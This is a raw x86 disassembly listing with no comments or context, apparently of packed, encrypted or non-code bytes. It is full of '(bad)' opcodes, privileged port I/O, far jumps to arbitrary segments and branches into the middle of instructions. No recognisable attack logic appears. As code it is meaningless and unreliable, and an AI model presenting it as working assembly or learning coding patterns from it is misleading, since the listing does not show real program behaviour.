  41603b:	fdivr  QWORD PTR [esi]
  41603d:	dec    edx
  41603e:	push   0x321b46b5
  416043:	dec    ebx
  416044:	adc    ebp,esi
  416046:	inc    ecx
  416047:	loopne 0x41607a
  416049:	mov    DWORD PTR [esi+0x70],ecx
  41604c:	mov    edi,0xb5dbbd66
  416051:	push   ss
  416052:	adc    BYTE PTR ds:0x17c1e030,ch
  416058:	jb     0x41605e
  41605a:	inc    ecx
  41605b:	(bad)  
  41605c:	pop    esp
  41605d:	jnp    0x41608c
  41605f:	test   al,0xba
  416061:	inc    ecx
  416062:	jb     0x416020
  416064:	mov    ebp,0x22897e39
  416069:	aam    0x60
  41606b:	push   ebp
  41606c:	test   BYTE PTR [ecx-0x7aa98b70],bh
  416072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416073:	in     al,dx
  416074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416075:	std    
  416076:	mov    ecx,0xa03f0ffe
  41607b:	sub    BYTE PTR [edx-0x6c],bl
  41607e:	loopne 0x4160f2
  416080:	push   cs
  416081:	stos   BYTE PTR es:[edi],al
  416082:	rcr    BYTE PTR [ebx],0xa6
  416085:	arpl   dx,sp
  416087:	stos   DWORD PTR es:[edi],eax
  416088:	cdq    
  416089:	js     0x4160a4
  41608b:	imul   BYTE PTR [ebp+0x4c]
  41608e:	loopne 0x416041
  416090:	sbb    esi,DWORD PTR [eax-0x15]
  416093:	xchg   DWORD PTR fs:[eax+0x3554037],edx
  41609a:	test   BYTE PTR [esi+0x32477bdf],ah
  4160a0:	jp     0x4160a0
  4160a2:	aam    0xa4
  4160a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a5:	test   eax,0x341d6399
  4160aa:	retf   
  4160ab:	push   ecx
  4160ac:	iret   
  4160ad:	call   0xa99293d6
  4160b2:	es mov dh,0xff
  4160b5:	pop    ebx
  4160b6:	aaa    
  4160b7:	push   edi
  4160b8:	int3   
  4160b9:	push   cs
  4160ba:	xor    edx,eax
  4160bc:	fsubr  st(7),st
  4160be:	fwait
  4160bf:	push   edi
  4160c0:	sbb    edi,DWORD PTR [edx-0x17cd20a0]
  4160c6:	mov    esp,0x8dae58e4
  4160cb:	popf   
  4160cc:	test   BYTE PTR [ebx],ch
  4160ce:	je     0x4160e1
  4160d0:	dec    edi
  4160d1:	mov    dh,0xfa
  4160d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160d4:	out    dx,al
  4160d5:	jo     0x4160f0
  4160d7:	cmp    dl,ah
  4160d9:	in     al,0xee
  4160db:	rol    BYTE PTR [ecx],0x4e
  4160de:	mov    edi,0x54fe85ec
  4160e3:	and    dl,0x5
  4160e6:	mov    al,al
  4160e8:	push   ecx
  4160e9:	add    eax,0x6fb0d1d7
  4160ee:	xor    bl,BYTE PTR [ebx+0x7b4f8787]
  4160f4:	inc    ebp
  4160f5:	sub    al,0xff
  4160f7:	mov    bl,0xf2
  4160f9:	in     al,0xa2
  4160fb:	add    eax,0xe99059ac
  416100:	jmp    0xfa1e:0xb74744b5
  416107:	push   0x6ca958d4
  41610c:	pop    ebx
  41610d:	jns    0x416102
  41610f:	xchg   ecx,eax
  416110:	loopne 0x41616c
  416112:	push   ecx
  416113:	push   ecx
  416114:	mul    ebx
  416116:	mov    ds:0x38bc313a,al
  41611b:	daa    
  41611c:	mov    cl,0x6b
  41611e:	enter  0x9d64,0xe
  416122:	jb     0x41617d
  416124:	add    al,0xf4
  416126:	xchg   edi,eax
  416127:	outs   dx,DWORD PTR ds:[esi]
  416128:	mov    esp,0x1e2ed187
  41612d:	into   
  41612e:	mov    bl,0x86
  416130:	lahf   
  416131:	add    ebp,DWORD PTR [esi+0xd4779d2]
  416137:	ret    0xb579
  41613a:	mov    edi,0x8f8b722a
  41613f:	int    0x7b
  416141:	in     al,0x98
  416143:	mov    ebx,0x6448a7b5
  416148:	xchg   BYTE PTR [edx],ch
  41614a:	int    0x33
  41614c:	sbb    eax,0x10ecb1dc
  416151:	cld    
  416152:	xchg   ebx,eax
  416153:	xor    al,0x89
  416155:	mov    ds:0x7e22959,al
  41615a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41615c:	push   edx
  41615d:	jmp    0x185b:0x27f9bdc
  416164:	xchg   esi,eax
  416165:	enter  0x2629,0xe
  416169:	mov    bl,0x78
  41616b:	stos   BYTE PTR es:[edi],al
  41616c:	sar    BYTE PTR [eax],cl
  41616e:	imul   eax,edx,0x127f5c88
  416174:	je     0x41612b
  416176:	lods   ax,WORD PTR ds:[esi]
  416178:	mov    dl,0xe5
  41617a:	pop    eax
  41617b:	sbb    al,0x40
  41617d:	imul   ecx,DWORD PTR [ebp-0x73e93f98],0x9a4a4381
  416187:	cmc    
  416188:	mov    bh,0x97
  41618a:	js     0x4161d1
  41618c:	xchg   edi,eax
  41618d:	push   eax
  41618e:	stos   BYTE PTR es:[edi],al
  41618f:	std    
  416190:	clc    
  416191:	inc    esi
  416192:	jae    0x416165
  416194:	cld    
  416195:	mov    ebx,0x3f1f44c4
  41619a:	test   DWORD PTR [edx],ebx
  41619c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41619d:	dec    edx
  41619e:	dec    ebx
  41619f:	fisub  DWORD PTR [ecx-0x24]
  4161a2:	test   eax,0x8e4b4c46
  4161a7:	(bad)  
  4161a9:	mov    ds:0x917f599,eax
  4161ae:	mov    esi,0xa2a60855
  4161b3:	cmp    edi,DWORD PTR [eax+ebx*4+0x21]
  4161b7:	mov    esi,0xd37fba3d
  4161bc:	fs xchg ebp,eax
  4161be:	add    eax,0xc4d70ea1
  4161c3:	pop    esi
  4161c4:	xor    al,0x43
  4161c6:	shl    DWORD PTR [edi],cl
  4161c8:	mov    eax,ds:0xb5ebaf33
  4161cd:	sbb    BYTE PTR [ecx],ch
  4161cf:	(bad)  
  4161d0:	enter  0x59f1,0xf8
  4161d4:	in     eax,0xbd
  4161d6:	mov    bl,0x1e
  4161d8:	loop   0x41616e
  4161da:	xchg   esp,eax
  4161db:	jmp    0x4161d8
  4161dd:	xchg   esi,eax
  4161de:	fisubr DWORD PTR [ecx+0x68]
  4161e1:	mov    cl,0x9a
  4161e3:	fstp   QWORD PTR [edi-0x27]
  4161e6:	out    0x8d,eax
  4161e8:	idiv   DWORD PTR [ecx]
  4161ea:	push   cs
  4161eb:	lods   al,BYTE PTR ds:[esi]
  4161ec:	mov    ?,ecx
  4161ee:	mov    dh,0xcb
  4161f0:	adc    BYTE PTR [ebp+0x1b],al
  4161f3:	in     eax,0x5d
  4161f5:	adc    bh,cl
  4161f7:	(bad)  
  4161f8:	dec    edi
  4161f9:	retf   
  4161fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161fb:	shl    BYTE PTR [eax-0x502b901f],cl
  416201:	dec    edx
  416202:	pop    edx
  416203:	cmp    eax,0x61f682f3
  416208:	xor    eax,0x537523b8
  41620d:	cld    
  41620e:	xchg   ecx,eax
  41620f:	je     0x416219
  416211:	rcr    DWORD PTR [eax+0x47],1
  416214:	(bad)  
  416215:	hlt    
  416216:	jno    0x41620e
  416218:	cld    
  416219:	xchg   cl,al
  41621b:	mov    eax,ds:0xea75fbdd
  416220:	call   0xf776d8f8
  416225:	sbb    al,0x8c
  416227:	xchg   ecx,eax
  416228:	iret   
  416229:	and    al,0x8
  41622b:	retf   0x1d76
  41622e:	out    0x43,al
  416230:	or     DWORD PTR [edi+0x7e88bbca],ebx
  416236:	pop    ss
  416237:	cdq    
  416238:	push   edi
  416239:	cmp    dh,ch
  41623b:	mov    ebp,0xd55471ef
  416240:	dec    ebp
  416241:	xchg   edi,eax
  416242:	mov    edi,0x74c22973
  416247:	inc    ebp
  416248:	loopne 0x416254
  41624a:	push   esi
  41624b:	sbb    cl,al
  41624d:	cld    
  41624e:	xor    BYTE PTR [edi+edx*2+0x72],0x96
  416253:	out    0x1d,al
  416255:	xor    eax,0xe5df7168
  41625a:	jmp    0xf4f58e60
  41625f:	dec    esi
  416260:	sub    esi,DWORD PTR [esi-0x4e]
  416263:	icebp  
  416264:	sbb    bh,cl
  416266:	cmc    
  416267:	xor    ch,BYTE PTR [edx-0x51]
  41626a:	lock push eax
  41626c:	enter  0x68b7,0xe8
  416270:	add    esi,esp
  416272:	cmp    ch,BYTE PTR [edi-0x40]
  416275:	jle    0x416252
  416277:	dec    esi
  416278:	enter  0xfa27,0x29
  41627c:	mov    ch,0x5c
  41627e:	outs   dx,DWORD PTR cs:[esi]
  416280:	sub    dh,ch
  416282:	pushf  
  416283:	inc    eax
  416284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416285:	add    DWORD PTR [edx-0x72383958],ecx
  41628b:	pop    ss
  41628c:	(bad)  
  41628d:	nop
  41628e:	inc    esi
  41628f:	add    ch,bl
  416291:	sbb    al,al
  416293:	inc    eax
  416294:	mov    edi,0x3a153e66
  416299:	lods   eax,DWORD PTR ds:[esi]
  41629a:	add    eax,DWORD PTR [ebp+0x2bfe907]
  4162a0:	or     ah,dl
  4162a2:	pop    edx
  4162a3:	jno    0x41627e
  4162a5:	bnd jl 0x41628e
  4162a8:	enter  0x52e7,0x2c
  4162ac:	mov    bl,0x65
  4162ae:	add    eax,0xf6a82807
  4162b3:	mov    bh,0x2
  4162b5:	cwde   
  4162b6:	mov    bl,0x49
  4162b8:	and    DWORD PTR [ecx+0x51672488],ebp
  4162be:	push   ecx
  4162bf:	lea    esp,[ecx-0x50]
  4162c2:	in     eax,dx
  4162c3:	sub    al,0x4d
  4162c5:	icebp  
  4162c6:	xor    eax,0xaa459946
  4162cb:	dec    eax
  4162cc:	fstp   QWORD PTR ds:0x2b71df4a
  4162d2:	jp     0x416284
  4162d4:	push   ecx
  4162d5:	mov    ah,0x3d
  4162d7:	(bad)  
  4162d8:	in     al,dx
  4162d9:	ja     0x4162be
  4162db:	shl    BYTE PTR ds:[edx+0x16],0xb
  4162e0:	mov    ebx,0xfb25f61
  4162e5:	jmp    0x41633e
  4162e7:	sub    BYTE PTR [edi+edx*2+0x43],cl
  4162eb:	sub    al,0xef
  4162ed:	inc    edi
  4162ee:	loopne 0x41631f
  4162f0:	xchg   edi,eax
  4162f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162f2:	xor    al,0xdb
  4162f4:	ret    
  4162f5:	push   edx
  4162f6:	or     eax,0x5d399231
  4162fb:	adc    DWORD PTR [edx],ebx
  4162fd:	push   edx
  4162fe:	retf   0x650e
  416301:	pusha  
  416302:	dec    esi
  416303:	ds add eax,0x2dbd0ece
  416309:	ror    edx,0x97
  41630c:	cmc    
  41630d:	aad    0xda
  41630f:	mov    ebp,0xeb1b9827
  416314:	mov    BYTE PTR [esp+edx*2],dh
  416317:	fidivr WORD PTR [edi-0x41]
  41631a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41631b:	fdivp  st(6),st
  41631d:	fcom   st(6)
  41631f:	cmovno eax,DWORD PTR [eax+0x7a]
  416323:	jno    0x416313
  416325:	sub    BYTE PTR [eax-0x195b4968],ah
  41632b:	mov    ecx,0xd601a2c9
  416330:	hlt    
  416331:	out    0x90,eax
  416333:	mov    bh,0x36
  416335:	(bad)  
  416337:	mov    ds:0xc1adaba3,eax
  41633c:	sub    ch,BYTE PTR [edx-0x54edde46]
  416342:	push   ecx
  416343:	dec    edi
  416344:	cmp    edx,ebp
  416346:	push   es
  416347:	loope  0x416338
  416349:	outs   dx,DWORD PTR ds:[esi]
  41634a:	out    dx,eax
  41634b:	xor    eax,0x983a689
  416350:	(bad)  
  416351:	ret    
  416352:	jmp    0xe094:0xd1978b8b
  416359:	mov    esp,ebp
  41635b:	mov    ecx,0x4c3502f5
  416360:	jno    0x41632a
  416362:	ins    DWORD PTR es:[edi],dx
  416363:	or     al,0xfe
  416365:	xchg   DWORD PTR [ebx-0x6a],ecx
  416368:	inc    ebp
  416369:	into   
  41636a:	test   al,0x12
  41636c:	and    eax,0x30016bd0
  416371:	mov    ecx,0x19d410d
  416376:	arpl   di,bp
  416378:	arpl   WORD PTR [esi+ebx*8-0xc],bx
  41637c:	cwde   
  41637d:	loop   0x41639c
  41637f:	dec    ebx
  416380:	in     al,dx
  416381:	(bad)
  416384:	push   ebp
  416385:	cmp    ebp,DWORD PTR [esi+0xd]
  416388:	arpl   WORD PTR [ebp+0x31],cx
  41638b:	(bad)  
  41638c:	jecxz  0x41639e
  41638e:	xor    dh,cl
  416390:	in     al,0x4f
  416392:	int3   
  416393:	add    ah,ch
  416395:	pop    edx
  416396:	daa    
  416397:	aas    
  416398:	or     edi,esp
  41639a:	out    0x47,al
  41639c:	(bad)  
  41639d:	call   0xa614a9df
  4163a2:	fst    DWORD PTR [esi+0xd7efc23]
  4163a8:	jmp    0xb9703d7e
  4163ad:	mov    cl,0x94
  4163af:	repnz stos DWORD PTR es:[edi],eax
  4163b1:	ja     0x416408
  4163b3:	push   esp
  4163b4:	pop    ebp
  4163b5:	mov    ecx,0x4c572204
  4163ba:	push   0x70
  4163bc:	cmp    DWORD PTR [edi],ebp
  4163be:	xchg   edx,eax
  4163bf:	inc    edi
  4163c0:	mov    BYTE PTR [esi],ah
  4163c2:	push   ecx
  4163c3:	push   ebx
  4163c4:	mov    bl,0xb6
  4163c6:	jle    0x4163b4
  4163c8:	outs   dx,DWORD PTR ds:[esi]
  4163c9:	fwait
  4163ca:	in     al,0x39
  4163cc:	out    dx,al
  4163cd:	xor    dl,BYTE PTR [ebx+0x71fe3e3f]
  4163d3:	les    ebp,FWORD PTR [ebp+0x46dd4da]
  4163d9:	mov    ds:0x8c5b287a,eax
  4163de:	mov    ebx,0x33ec419b
  4163e3:	xor    BYTE PTR [edi+0x631edac2],al
  4163e9:	(bad)  
  4163ea:	mov    ds:0xabd3736a,eax
  4163ef:	into   
  4163f0:	add    al,0xfe
  4163f2:	call   0xd0495918
  4163f7:	cmp    al,0xe7
  4163f9:	sar    BYTE PTR [edi-0x20],cl
  4163fc:	or     eax,0x8f7b9981
  416401:	popf   
  416402:	add    ebx,DWORD PTR gs:[esi+0x27]
  416406:	add    al,BYTE PTR [ebx]
  416408:	xlat   BYTE PTR ds:[ebx]
  416409:	int3   
  41640a:	sub    DWORD PTR [esi-0x76428af9],0xffffffe7
  416411:	ror    DWORD PTR [ecx+0x17],1
  416414:	ins    BYTE PTR es:[edi],dx
  416415:	js     0x4163e8
  416417:	mov    dl,BYTE PTR gs:[ebx]
  41641a:	mov    ebp,0x5fee041f
  41641f:	add    eax,0x611108ce
  416424:	jle    0x4163d6
  416426:	std    
  416427:	or     eax,0x6ab8b291
  41642c:	ins    BYTE PTR es:[edi],dx
  41642d:	or     DWORD PTR [eax],0xcff40aab
  416433:	fwait
  416434:	push   ebx
  416435:	cmp    BYTE PTR [ecx],dl
  416437:	or     eax,DWORD PTR [eax-0x80]
  41643a:	inc    ecx
  41643b:	cmp    bl,BYTE PTR [esi]
  41643d:	inc    BYTE PTR [eax]
  41643f:	push   ss
  416440:	sub    eax,0xaf94b8f3
  416445:	test   BYTE PTR [ebx],0x9b
  416448:	push   ds
  416449:	xchg   ebp,eax
  41644a:	test   al,0x80
  41644c:	jnp    0x416422
  41644e:	out    dx,al
  41644f:	push   cs
  416450:	cdq    
  416451:	cwde   
  416452:	jp     0x4164ad
  416454:	es cmc 
  416456:	scas   eax,DWORD PTR es:[edi]
  416457:	pop    ecx
  416458:	stos   DWORD PTR es:[edi],eax
  416459:	mov    esi,0x3e01d8c1
  41645e:	inc    ebp
  41645f:	jo     0x41641d
  416461:	int3   
  416462:	and    BYTE PTR [edi-0x32],al
  416465:	jne    0x416455
  416467:	pop    edi
  416468:	daa    
  416469:	inc    edx
  41646a:	call   0x76dd:0x2edbff18
  416471:	xlat   BYTE PTR ds:[ebx]
  416472:	mov    bl,BYTE PTR [eax-0x7eba8ad2]
  416478:	rcr    DWORD PTR cs:[edx-0x11],0x90
  41647d:	xchg   ebx,eax
  41647e:	mov    ebp,0xa264929d
  416483:	pop    es
  416484:	(bad)  
  416485:	sbb    al,0x1a
  416487:	dec    eax
  416488:	nop
  416489:	mov    ebp,DWORD PTR [edi]
  41648b:	lods   eax,DWORD PTR ds:[esi]
  41648c:	imul   edi,DWORD PTR [ebp+eax*1-0x24],0xf8f643cb
  416494:	test   al,0x19
  416496:	sbb    ch,BYTE PTR [ecx*4-0x1ccd532]
  41649d:	pusha  
  41649e:	into   
  41649f:	pop    ecx
  4164a0:	inc    edi
  4164a1:	loop   0x41650f
  4164a3:	mov    ss,WORD PTR [ebx-0x24]
  4164a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a7:	lods   al,BYTE PTR ds:[esi]
  4164a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164a9:	push   esi
  4164aa:	(bad)  
  4164ab:	fnstcw WORD PTR [edi+0x1f]
  4164ae:	dec    esi
  4164af:	aad    0x35
  4164b1:	sbb    DWORD PTR [eax-0x77],0xffffffaa
  4164b5:	(bad)  
  4164b7:	xor    DWORD PTR [ebp-0x11],ecx
  4164ba:	mov    ds:0x17ade5d2,al
  4164bf:	cmc    
  4164c0:	addr16 pop ss
  4164c2:	loopne 0x416489
  4164c4:	inc    esp
  4164c5:	xchg   BYTE PTR [edx-0x3218d9af],dl
  4164cb:	dec    edi
  4164cc:	aaa    
  4164cd:	xchg   DWORD PTR [ecx-0x1f],esp
  4164d0:	cdq    
  4164d1:	xor    esi,ebp
  4164d3:	iret   
  4164d4:	test   edx,ebp
  4164d6:	sub    BYTE PTR [ecx-0x5bae61cb],ah
  4164dc:	das    
  4164dd:	ins    BYTE PTR es:[edi],dx
  4164de:	push   0xd16cf9c0
  4164e3:	mov    al,ds:0x7abf4848
  4164e8:	sbb    BYTE PTR [ecx],ah
  4164ea:	adc    BYTE PTR ds:0xc8573652,cl
  4164f0:	mov    WORD PTR [ebx+ecx*2],ds
  4164f3:	in     eax,dx
  4164f4:	push   esi
  4164f5:	inc    ebx
  4164f6:	mov    ah,0x4b
  4164f8:	jo     0x416565
  4164fa:	test   al,0x31
  4164fc:	not    BYTE PTR [esi-0x24]
  4164ff:	mov    ebp,0x6cea41cd
  416504:	mov    al,0x62
  416506:	ja     0x41648b
  416508:	pop    ebp
  416509:	mov    edx,0x537615f4
  41650e:	rcr    DWORD PTR [eax+ebx*1-0x12ece12d],cl
  416515:	push   ecx
  416516:	ret    
  416517:	xor    BYTE PTR [edx+0x17],bl
  41651a:	mov    ch,0x78
  41651c:	cs dec ecx
  41651e:	leave  
  41651f:	jo     0x4164b9
  416521:	fst    QWORD PTR [ebx-0x39]
  416524:	fsub   QWORD PTR [edx+0x36282a83]
  41652a:	or     eax,0xad2009c6
  41652f:	test   BYTE PTR [edx-0x5e41ebad],0xa7
  416536:	inc    ebx
  416537:	add    eax,0x7b6b89ea
  41653c:	xor    ch,cl
  41653e:	sahf   
  41653f:	test   ecx,eax
  416541:	push   0xffffffb5
  416543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416544:	stos   DWORD PTR es:[edi],eax
  416545:	gs hlt 
  416547:	pop    ss
  416548:	mov    edi,0xe81354f7
  41654d:	(bad)  
  41654e:	retf   0xf244
  416551:	push   ebp
  416552:	or     al,0xeb
  416554:	add    cl,dh
  416556:	cwde   
  416557:	inc    ecx
  416558:	cmp    al,0x53
  41655a:	xchg   ebx,eax
  41655b:	rcl    DWORD PTR fs:[ebx],0xf9
  41655f:	or     BYTE PTR [ecx],ch
  416561:	xchg   ecx,eax
  416562:	js     0x416537
  416564:	jo     0x416507
  416566:	mov    ebp,0x5d23ae14
  41656b:	repz cld 
  41656d:	jp     0x4165d9
  41656f:	mov    dl,0x85
  416571:	sbb    eax,0x61c992c2
  416576:	jge    0x416599
  416578:	scas   al,BYTE PTR es:[edi]
  416579:	shl    bl,1
  41657b:	inc    esp
  41657c:	lea    ebx,[edx*1-0x560bc35d]
  416583:	aas    
  416584:	(bad)  
  416585:	cmp    BYTE PTR [ebx],bh
  416587:	outs   dx,BYTE PTR ds:[esi]
  416588:	jnp    0x41653b
  41658a:	cs test eax,0x7c7e3c64
  416590:	ds dec esi
  416592:	in     al,dx
  416593:	lds    ecx,FWORD PTR [eax+edx*2]
  416596:	mov    al,0x9e
  416598:	cmp    DWORD PTR [ebp+0xa6cb1d8],0xcb96a7ce
  4165a2:	and    ebp,DWORD PTR [eax]
  4165a4:	fisub  WORD PTR [eax+0x0]
  4165a7:	cdq    
  4165a8:	mov    BYTE PTR [ebx],0x90
  4165ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165ac:	ror    BYTE PTR [ecx-0x3564ef07],1
  4165b2:	sbb    al,0xd
  4165b4:	xchg   DWORD PTR [esi+0x24273755],edx
  4165ba:	scas   eax,DWORD PTR es:[edi]
  4165bb:	loop   0x4165ec
  4165bd:	dec    ebx
  4165be:	cmp    DWORD PTR [edx+edx*2],eax
  4165c1:	ins    DWORD PTR es:[edi],dx
  4165c2:	mov    bh,0xc3
  4165c4:	mov    BYTE PTR [eax-0x12],dh
  4165c7:	add    al,ch
  4165c9:	xor    al,0xf8
  4165cb:	dec    ebx
  4165cc:	sbb    eax,esi
  4165ce:	or     ecx,ebp
  4165d0:	loope  0x416567
  4165d2:	dec    eax
  4165d3:	sbb    DWORD PTR [esi],edx
  4165d5:	idiv   DWORD PTR [ecx+ecx*4+0x6cd9cbaa]
  4165dc:	inc    edi
  4165dd:	fst    QWORD PTR [ebp+eax*8+0x7d]
  4165e1:	in     al,dx
  4165e2:	mov    ch,bh
  4165e4:	jnp    0x4165f3
  4165e6:	iret   
  4165e7:	and    ebp,DWORD PTR [eax]
  4165e9:	push   edi
  4165ea:	push   esi
  4165eb:	mov    ebx,0x61f49d74
  4165f0:	fimul  DWORD PTR [ecx]
  4165f2:	push   es
  4165f3:	add    edx,DWORD PTR [eax-0x4fa6ff06]
  4165f9:	cdq    
  4165fa:	dec    eax
  4165fb:	mov    ah,0x36
  4165fd:	mov    bl,0xfc
  4165ff:	test   eax,0xa2c6c473
  416604:	ins    BYTE PTR es:[edi],dx
  416605:	xor    DWORD PTR [ebx+ebp*8+0x7],ebp
  416609:	ss dec esp
  41660b:	push   eax
  41660c:	test   BYTE PTR [esi+eiz*4],0x8c
  416610:	cs pop edx
  416612:	hlt    
  416613:	bound  esp,QWORD PTR [ebp-0x2]
  416616:	mov    cl,0x9d
  416618:	dec    eax
  416619:	fbstp  TBYTE PTR [eax+0x532079be]
  41661f:	lods   eax,DWORD PTR fs:[esi]
  416621:	fstp   QWORD PTR [edx+0x1004f4e9]
  416627:	rcl    DWORD PTR [ebx-0x2942df1c],0xf2
  41662e:	loopne 0x416638
  416630:	cwde   
  416631:	rol    BYTE PTR [esi+0x4391319f],cl
  416637:	sbb    esp,edi
  416639:	popa   
  41663a:	lea    ebx,[ecx+0x2ac0d2d8]
  416640:	pushf  
  416641:	ss push 0x9f0b2894
  416647:	retf   
  416648:	sub    eax,0xb10f2a03
  41664d:	daa    
  41664e:	nop
  41664f:	pop    esi
  416650:	imul   ebp,esp,0x3d
  416653:	xchg   BYTE PTR [edx],dl
  416655:	jnp    0x416689
  416657:	jg     0x4166c4
  416659:	cmp    ah,dh
  41665b:	retf   0xaabe
  41665e:	sub    al,0x3e
  416660:	fisttp WORD PTR [ebx]
  416662:	aad    0xbd
  416664:	adc    DWORD PTR es:[ecx-0x335e49b],ecx
  41666b:	inc    esp
  41666c:	sahf   
  41666d:	xchg   ebx,eax
  41666e:	rcr    DWORD PTR [edx],0xbd
  416671:	sub    DWORD PTR [esi],esi
  416673:	outs   dx,DWORD PTR ds:[esi]
  416674:	dec    ebx
  416675:	mov    ah,0xa5
  416677:	xchg   ebp,eax
  416678:	test   ah,dh
  41667a:	gs int3 
  41667c:	pop    DWORD PTR [ebp+0x3beb04d]
  416682:	or     dh,0xf4
  416685:	sbb    esp,ecx
  416687:	pusha  
  416688:	xor    al,0x2f
  41668a:	gs leave 
  41668c:	pushf  
  41668d:	jnp    0x4166df
  41668f:	in     al,dx
  416690:	shr    eax,cl
  416692:	nop
  416693:	add    eax,0x46d6b09e
  416698:	fild   DWORD PTR ds:0xa973130a
  41669e:	jle    0x4166ff
  4166a0:	or     al,0x75
  4166a2:	repz jne 0x416674
  4166a5:	idiv   DWORD PTR [ebx]
  4166a7:	inc    ebx
  4166a8:	mov    DWORD PTR [edi+0x34],ebx
  4166ab:	push   ebx
  4166ac:	aam    0x8d
  4166ae:	imul   eax,DWORD PTR ds:0x2a40be17,0x63bcfe90
  4166b8:	(bad)  
  4166ba:	and    dh,BYTE PTR [edi+esi*2]
  4166bd:	ficomp WORD PTR [edx+0xe]
  4166c0:	sbb    eax,0x74d764c9
  4166c5:	jge    0x4166d1
  4166c7:	adc    al,bl
  4166c9:	and    edx,DWORD PTR [eax-0x17cfe12]
  4166cf:	sub    bh,bh
  4166d1:	dec    ebp
  4166d2:	push   ds
  4166d3:	mov    dl,0x2b
  4166d5:	cmp    eax,ecx
  4166d7:	fs push ebx
  4166d9:	cmp    eax,DWORD PTR [edx+esi*2+0x4e1c07a8]
  4166e0:	gs push 0x62
  4166e3:	stc    
  4166e4:	leave  
  4166e5:	xor    DWORD PTR [ebp+0x2aba4bb3],esi
  4166eb:	xor    BYTE PTR [esi-0x78483a5a],bh
  4166f1:	sahf   
  4166f2:	sbb    edx,DWORD PTR [ebp-0x4]
  4166f5:	inc    ebx
  4166f6:	test   BYTE PTR [ebx-0x69b81356],0xf6
  4166fd:	iret   
  4166fe:	xor    ebp,ebp
  416700:	mov    edx,0x35c9a832
  416705:	mov    bh,0x7d
  416707:	xor    dh,dh
  416709:	or     al,0x23
  41670b:	aas    
  41670c:	pop    ebx
  41670d:	scas   al,BYTE PTR es:[edi]
  41670e:	inc    ebx
  41670f:	test   al,0xd7
  416711:	pop    edi
  416712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416713:	inc    ecx
  416714:	ret    
  416715:	or     eax,0xf8a90b11
  41671a:	aas    
  41671b:	(bad)  
  41671c:	imul   edi,DWORD PTR [edi+esi*4-0x24],0xa4cfe041
  416724:	push   esi
  416725:	mov    esp,0x3ad99360
  41672a:	dec    eax
  41672b:	xor    DWORD PTR [ebx-0x36926951],esi
  416731:	or     ebx,0x9fa7dda2
  416737:	jg     0x4166f6
  416739:	aam    0x72
  41673b:	xor    esp,esp
  41673d:	inc    ebx
  41673e:	inc    ecx
  41673f:	sti    
  416740:	sbb    eax,0xf81b8941
  416745:	inc    ecx
  416746:	xchg   esp,eax
  416747:	mov    ch,bl
  416749:	cld    
  41674a:	in     eax,dx
  41674b:	arpl   di,ax
  41674d:	dec    edi
  41674e:	imul   BYTE PTR ss:[ecx+0x5a72d2c5]
  416755:	js     0x41678c
  416757:	adc    dl,BYTE PTR gs:[edi+0x33]
  41675b:	leave  
  41675c:	cmp    al,0xc9
  41675e:	add    al,0xfd
  416760:	stos   DWORD PTR es:[edi],eax
  416761:	mov    ebp,0x2f206be7
  416766:	mov    edx,0xcd33c4c3
  41676b:	inc    eax
  41676c:	scas   eax,DWORD PTR es:[edi]
  41676d:	fidiv  DWORD PTR [esi-0x8]
  416770:	cdq    
  416771:	bound  eax,QWORD PTR [edi]
  416773:	mov    ds:0x29fd3add,al
  416778:	mov    eax,0x83d96c0e
  41677d:	or     bl,bh
  41677f:	or     al,0x2d
  416781:	jno    0x416722
  416783:	inc    ebp
  416784:	xchg   ebx,eax
  416785:	fadd   QWORD PTR [esi]
  416787:	outs   dx,BYTE PTR ds:[esi]
  416788:	out    0x95,al
  41678a:	sub    al,0x73
  41678c:	stos   BYTE PTR es:[edi],al
  41678d:	in     eax,0x12
  41678f:	sahf   
  416790:	xchg   BYTE PTR [ecx-0x9c010e9],cl
  416796:	jno    0x4167e9
  416798:	les    eax,FWORD PTR [ecx-0x3f]
  41679b:	cmp    eax,0x82154017
  4167a0:	mov    esi,0x328087
  4167a5:	push   ebx
  4167a6:	or     DWORD PTR [edi],ebx
  4167a8:	adc    BYTE PTR [ecx-0x1a],0xa5
  4167ac:	rcr    DWORD PTR [ebp+edi*8-0x27],0x69
  4167b1:	mov    ds:0x4886cb1a,eax
  4167b6:	jae    0x416764
  4167b8:	lock dec edi
  4167ba:	mov    ds:0x50582f26,eax
  4167bf:	push   cs
  4167c0:	xor    al,0x1d
  4167c2:	xchg   edi,eax
  4167c3:	mov    ebx,0xbc83d7f9
  4167c8:	ret    0xefcd
  4167cb:	jne    0x416761
  4167cd:	hlt    
  4167ce:	pop    ebx
  4167cf:	fstp   st(5)
  4167d1:	mov    edx,0xa12263b3
  4167d6:	sbb    al,0xc7
  4167d8:	and    edx,DWORD PTR [edi]
  4167da:	repz test DWORD PTR [ecx+eax*8+0x475bb2ef],edx
  4167e2:	inc    ebx
  4167e3:	and    DWORD PTR [eax],eax
  4167e5:	test   edi,esi
  4167e7:	xor    ah,BYTE PTR [esi+0x65fdca7a]
  4167ed:	(bad)  
  4167ef:	dec    DWORD PTR [edx]
  4167f1:	sub    ch,BYTE PTR [edx+0x43feb5ff]
  4167f7:	pop    ebp
  4167f8:	ins    DWORD PTR es:[edi],dx
  4167f9:	imul   ecx,DWORD PTR [eax+0x3b],0x74d2a93d
  416800:	hlt    
  416801:	push   eax
  416802:	push   edi
  416803:	(bad)  
  416804:	xor    esi,DWORD PTR [ebx]
  416806:	stos   BYTE PTR es:[edi],al
  416807:	mov    esi,0xce0f4f89
  41680c:	ret    0x443a
  41680f:	dec    edx
  416810:	call   0xecf7:0xc5501acf
  416817:	push   cs
  416818:	jecxz  0x416868
  41681a:	nop
  41681b:	aas    
